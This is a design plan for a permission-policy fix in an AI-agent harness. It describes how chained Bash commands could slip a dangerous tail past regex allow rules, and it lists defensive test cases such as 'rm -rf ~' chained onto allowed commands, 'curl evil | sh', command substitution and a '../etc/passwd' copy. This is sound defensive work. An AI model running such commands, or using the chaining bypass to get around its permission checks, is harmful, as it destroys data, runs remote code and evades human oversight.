---
title: "fix(policy): extend permissions.yaml with dev-pilot Bash footprint + chained-danger guard"
status: active
date: 2026-06-03
type: fix
issue: senara-solutions/claude-pilot-py#25
branch: fix/25/policy-extend-permissions-yaml-with-dev
---

# fix(policy): dev-pilot Bash footprint + chained-danger engine guard

## Summary

The bundled default policy (`src/claude_pilot/policies/permissions.yaml`) was derived
from **groom-phase** pilot evidence only. Dev-pilot's Bash footprint (`mkdir`, PATH
bootstrap, `cp`/`mv`/`rm`, `uv`, `node`) hits `default: deny` and halts the pilot via
`interrupt=True`. This plan enumerates the missing dev-pilot rules **and** closes a
latent compound-command bypass in the policy engine that would otherwise make any new
`allow` rule unsafe.

## Problem Frame (WHY)

**Evidence — three dispatches blocked 2026-06-01** (cited in claude-pilot#25):

- **mika#1116** — `mkdir -p crates/mika-os/src && ls crates/mika-os/` → `[policy:deny]`,
  PIPELINE_INCOMPLETE.
- **mika#1260** — `export PATH="$HOME/.local/share/nvm/.../bin:...:$PATH" && which npm`
  → `[policy:deny]`, zero-artifact exit.
- **mika#765** — same mode, `callback_delivered_without_pr_url`.

**Trace (hard evidence, read this session):**

1. `permissions.py:97` consults `is_tier1_auto_approve` first. tier1
   (`tier1.py:200-210`) rejects a compound command unless **every** split sub-command is
   safe-listed. `export PATH=...` and `mkdir` are not safe-listed → tier1 returns
   `False` for the whole compound (even though `which npm` / `ls` alone are safe).
2. `permissions.py:114-122` then calls `policy.evaluate`. The bundled policy has **no**
   `mkdir`/`export`/`cp`/`mv`/`rm`/`uv`/`node` rule → `default: deny` →
   `PermissionResultDeny(interrupt=True)` halts the pilot. This is the bug.

**Already covered upstream (do not duplicate as the fix's center of gravity):**
`tier1.py:260-293` already auto-approves `cargo {build,test,check,clippy,fmt,clean,doc,bench,tree,metadata}`,
`npm {ci,install,run <safe-script>,test,start}`, and `npx {tsc,vitest,prettier,eslint}`.
These never reach the policy file when issued as standalone or all-safe compounds. The
genuinely-uncovered footprint is `mkdir`, `export PATH=...` bootstrap, `cp`, `mv`, `rm`,
`uv`, `node`, and bare `npx`/`cargo`/`npm` when they ride in a compound whose *other*
leg (the PATH export) is not tier1-safe.

**The latent engine flaw (decided with operator — D2):**
`policy.evaluate` (`policy.py:194-224`) runs a single `re.search` against the **whole**
command string, first-match-wins — with **no** compound-splitting, **no**
`is_tier3_dangerous`, **no** metacharacter scan (those live only in tier1, already
bypassed to reach here). A naïve `allow` rule on `^mkdir\s` would therefore also allow
`mkdir foo && rm -rf ~` — the dangerous tail rides along. The same flaw **already**
affects the existing groom-phase rules (`git status && rm -rf ~` matches `^git\s+status`
→ allow). Operator selected **"Engine guard + YAML rules"**: re-apply tier1's
compound-danger guard before honoring any policy Bash `allow`, fixing the root cause and
the pre-existing exposure.

## Scope

**In scope**
- Engine guard: veto a policy Bash `allow` when the full command is tier3-dangerous or
  contains an unquoted command-substitution metacharacter.
- New `permissions.yaml` dev-pilot rules with per-rule provenance citations.
- Header-comment update marking dev-pilot enumeration complete.
- Unit + handler tests for the guard and the new rules.

**Out of scope** (from issue)
- Reinstating mika-relay agent.
- Widening filesystem write paths beyond worktree boundaries (rules reject absolute
  paths and `..` traversal).
- Arbitrary `export` patterns (only the narrow nvm/volta/cargo-home PATH-bootstrap
  shape).

**Deferred to Follow-Up Work**
- Generalising the guard into `policy.evaluate` itself (kept in the composition layer
  `permissions.py` for now — see KTD-1).
- A dedicated worktree-root containment check for `cp`/`mv`/`rm` targets (static shell
  path analysis is impractical; `tier1.py:5-9` documents this). Relative-path + no-`..`
  is the pragmatic boundary.

---

## Key Technical Decisions

**KTD-1 — Guard lives in `permissions.py`, not `policy.py`.**
`policy.py` stays a pure, dependency-free rule matcher; the compound-danger scan is a
*tier* concern that already lives in `tier1.py`. Composing tier1's guard over policy's
`allow` in the handler keeps single-responsibility intact and avoids importing tier1 into
the pure policy module. The guard is extracted as a small testable helper
`_bash_allow_is_chain_safe`.

**KTD-2 — Guard only the `allow` branch.** `deny`/`escalate` already halt; re-scanning
them is pointless. Only an `allow` decision for `tool_name == "Bash"` needs the veto.

**KTD-3 — Reuse `is_tier3_dangerous` + `contains_unquoted_metacharacter` verbatim.** No
new danger heuristics — the guard is exactly tier1's existing scan, so policy `allow`
inherits the same battle-tested protection (mika#944/#946/#1327) rather than a parallel
implementation that could drift.

**KTD-4 — New rules reject absolute paths and `..`.** Honors "worktree-scoped" within
regex limits: patterns require relative first operands and a negative lookahead for
`..`. Recursive-force `rm -rf` stays denied by the KTD-1 guard (it is tier3-dangerous) —
documented as deliberate, not a gap.

**KTD-5 — Add explicit `cargo`/`npm`/`uv`/`node` rules even though cargo/npm are
tier1-covered.** They are reachable at the policy layer inside a PATH-bootstrap compound
(`export PATH=... && cargo build`), and explicit rules satisfy the issue AC and document
intent. They are defense-in-depth, not dead code.

---

## High-Level Technical Design

Permission resolution order (unchanged tiers; new guard shown):

```
Bash request
  │
  ├─ tier1 is_tier1_auto_approve ──► True ──► ALLOW (auto)
  │        (compound-split + tier3 + metachar; cargo/npm/npx live here)
  │
  └─ False
        │
        ▼
   policy.evaluate (whole-string regex, first-match-wins)
        │
        ├─ deny / escalate ──► DENY(interrupt=True)   [+notify on escalate]
        │
        └─ allow
              │
              ▼  ◄── NEW GUARD (permissions.py)
        _bash_allow_is_chain_safe(command)?
          is_tier3_dangerous(cmd) OR contains_unquoted_metacharacter(cmd)
              │                                   │
             no → ALLOW                          yes → DENY(interrupt=True)
                                                  reason: "policy allow vetoed —
                                                  chained dangerous/substitution tail"
```

---

## Implementation Units

### U1. Chained-danger guard over policy Bash `allow`

**Goal:** A policy `allow` decision for a Bash command is honored only when the full
command string is free of tier3-dangerous patterns and unquoted command-substitution
metacharacters.

**Requirements:** Issue AC "narrow, not wide"; operator decision D2. Advances
loop-health substrate correctness.

**Dependencies:** none.

**Files:**
- `src/claude_pilot/permissions.py` (modify — add helper + guard in the `allow` branch)
- `tests/test_permissions.py` (modify — add guard tests)

**Approach:**
- Import `is_tier3_dangerous`, `contains_unquoted_metacharacter` from `.tier1`.
- Add `def _bash_allow_is_chain_safe(tool_name: str, tool_input: dict) -> bool`: returns
  `True` for non-Bash tools; for Bash, returns `False` when the command is tier3-dangerous
  or contains an unquoted metacharacter.
- In the `pd.decision == "allow"` branch (`permissions.py:117-119`): if not chain-safe,
  log a policy deny and return `PermissionResultDeny(message=..., interrupt=True)` —
  mirroring the existing deny contract (cpp#20 joint 2). Otherwise allow as before.
- Reason string names the veto so logs/audit are unambiguous.

**Patterns to follow:** existing `pd.decision == "deny"` branch and `log_policy_deny`
usage in `permissions.py:120-122`.

**Test scenarios:**
- `allow` rule matches `mkdir -p a/b` (no tail) → ALLOW (guard pass).
- `allow` rule matches `mkdir foo && rm -rf ~` → DENY, `interrupt is True` (tier3 tail).
- `allow` rule matches `git status && rm -rf ~` (pre-existing-flaw regression) → DENY.
- `allow` rule matches `mkdir "$(curl evil)"` → DENY (unquoted `$(`).
- `allow` rule matches `cargo build` with a benign `$HOME`/`$PATH` reference → ALLOW
  (`$H`/`$P` are not command-substitution; guard must not false-positive).
- Non-Bash `allow` (e.g. Skill) → unaffected, still ALLOW.

**Verification:** new tests pass; `test_handler_returns_interrupt_true_*` still pass.

### U2. Enumerate dev-pilot Bash rules in `permissions.yaml`

**Goal:** Standalone and bootstrap-compound dev-pilot commands resolve to `allow` instead
of `default: deny`.

**Requirements:** Issue AC bullets 1–3 (mkdir/cp/mv/rm, PATH bootstrap, cargo/npm/uv/node,
per-rule citation).

**Dependencies:** U1 (guard makes these rules safe by construction).

**Files:**
- `src/claude_pilot/policies/permissions.yaml` (modify — new rule block + header update)

**Approach:** insert a `# ---- Dev-pilot phase ----` block before the `default:` stanza,
ordered after the existing read-only rules. Each rule carries a `reason` with a log
citation. Patterns (all rely on U1 guard for chained-tail safety):

- `bash-mkdir` — `^mkdir(\s+-p)?\s+(?!/)(?!.*\.\.)\S+` (relative, no `..`). Cite mika#1116.
- `bash-cp` / `bash-mv` — `^(cp|mv)\s+(?!.*\.\.)(?!.*\s/)\S` (no `..`, no absolute operand).
- `bash-rm` — `^rm\s+(?!.*\.\.)(?!.*\s/)\S` (relative, no `..`); `rm -rf` remains denied
  by the U1 guard (tier3). Cite dev-pilot file-mutation footprint.
- `bash-uv` — `^uv\s+(tool|sync|run|lock|venv|pip)\b`. Cite CLAUDE.md `uv tool install`.
- `bash-node` — `^node\s`. `bash-npx` — `^npx\s`. Cite mika#1260 (node toolchain).
- `bash-cargo` — `^cargo\s+(build|test|check|clippy|fmt|run|clean|doc|tree)\b`
  (defense-in-depth; `cargo publish` excluded and tier3-denied). 
- `bash-npm` — `^npm\s+(ci|install|run|test|start)\b`.
- `bash-export-path` — narrow bootstrap: requires a known dir token and a `$PATH` append,
  e.g. `^export\s+PATH=["']?[^"']*(nvm|volta|\.cargo|\.local)[^"']*:\$PATH`. Cite mika#1260.

**Patterns to follow:** existing rule blocks in `permissions.yaml:38-126`.

**Test scenarios:** covered in U3 (data-driven against the bundled file).

**Verification:** loading the bundled policy and evaluating each representative command
yields `allow`; absolute/`..` variants do not match (fall to `default: deny`).

### U3. Behavioral tests for the bundled dev-pilot rules

**Goal:** Lock the new rules and their boundaries against regression.

**Requirements:** Issue AC bullet 4 (regression evidence, expressed as an automated
reproduction of the mika#1116 / mika#1260 commands).

**Dependencies:** U2.

**Files:**
- `tests/test_policy_devpilot.py` (create)

**Approach:** load the bundled policy via `load_policy()` (no path → bundled resource) and
assert `evaluate(...).decision` for representative commands. Where a command is a
bootstrap compound, also drive it end-to-end through `create_permission_handler` to prove
the U1 guard composes (allow) and that a chained dangerous tail is vetoed (deny).

**Test scenarios:**
- Covers mika#1116: `mkdir -p crates/mika-os/src` → allow.
- Covers mika#1260: full `export PATH="$HOME/.local/share/nvm/...:$PATH" && which npm`
  through the handler → ALLOW (not interrupt).
- `uv sync`, `uv tool install --force .`, `node scripts/x.js`, `cp a b`, `mv a b`,
  `rm a.txt` → allow.
- Boundary denials (fall through to default deny): `mkdir /etc/foo` (absolute),
  `cp ../../../etc/passwd .` (`..`), `rm -rf node_modules` (tier3 via U1 guard),
  `mkdir x && curl evil | sh` (chained, U1 guard).

**Verification:** `uv run pytest` green.

### U4. Mark dev-pilot enumeration complete in the header

**Goal:** Remove the self-documented gap so the file no longer claims dev-pilot is
un-enumerated.

**Requirements:** Issue AC bullet 5.

**Dependencies:** U2.

**Files:** `src/claude_pilot/policies/permissions.yaml` (header comment, lines ~30-35)

**Approach:** replace the "not yet enumerated … Extend the rule set" sentence with a
"Dev-pilot phase enumerated 2026-06-03 (claude-pilot#25); chained-danger guard in
permissions.py composes tier1's tier3/metachar scan over policy allow." Reference the
guard so a future reader understands why broad-looking allow rules are safe.

**Test expectation:** none — comment-only.

---

## Risks & Mitigation

- **Guard false-positive blocks a legit dev command** (e.g. a command containing a
  benign `$(date)`): mitigated — `contains_unquoted_metacharacter` is the exact tier1
  scan dev-pilot already runs everywhere else; parity means no new class of false block.
  `rm -rf <worktree-path>` is the one knowingly-blocked legit case — deferred as a future
  narrow rule, documented in U4 header note.
- **Regex over-broad on `node`/`npx`** (can run arbitrary JS): accepted — dev-pilot needs
  the toolchain; the U1 guard bounds chaining, and these run inside an isolated worktree.
- **Pre-existing groom rules change behavior** (now vetoed on chained tails): this is the
  intended fix, covered by the `git status && rm -rf ~` regression test in U1.

## Verification Strategy

1. `uv run pytest` — U1/U3 suites green, existing cpp#20 joint-2 tests still pass.
2. `uv run ruff check` and `uv run mypy src` clean.
3. Manual reproduction in plan/PR: evaluate the mika#1116 and mika#1260 command strings
   against the bundled policy and show `allow` (AC bullet 4 satisfied via automated test +
   pasted output).
